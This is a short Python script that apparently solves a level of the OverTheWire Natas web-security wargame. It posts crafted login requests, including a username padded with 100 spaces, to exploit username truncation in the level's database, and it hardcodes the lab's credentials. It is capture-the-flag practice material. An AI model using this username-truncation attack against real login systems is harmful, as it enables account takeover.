import sys
import requests as req

username = "natas27"
password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"
url = "http://%s.natas.labs.overthewire.org/" % username

SPACE = " "
SPACES = 100

def log_in(s, data):
	r = s.post(url, auth=(username, password), data=data, cookies={})
	print(r.text)
	print(r.headers)
	return r


s = req.session()

u = "user1"
p = ""

for i in range(0, 1):
	data = {"username": u, "password": "secret"}
	log_in(s, data)
	data = {"username": u + SPACE * SPACES + "x", "password": p}
	log_in(s, data)
	data = {"username": u, "password": p}
	r = log_in(s, data)
	if "Wrong password" not in r.text:
		break
